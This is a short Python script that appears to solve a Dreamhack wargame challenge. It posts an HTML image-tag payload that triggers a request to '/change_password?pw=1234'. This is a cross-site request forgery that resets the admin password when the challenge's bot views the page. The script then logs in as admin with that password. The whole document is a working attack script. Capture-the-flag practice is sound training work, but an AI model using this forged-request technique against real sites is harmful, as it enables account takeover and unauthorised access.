import requests

port = 13544
url_index = f"http://host1.dreamhack.games:{port}/"
url_flag = url_index + "flag"
url_login = url_index + "login"
url_memo = url_index + "memo"

param = {"param": '<img src="/change_password?pw=1234">'}
requests.post(url_flag, data=param)

param = {"username": "admin", "password": "1234"}
response = requests.post(url_login, data=param)
print(response.text)
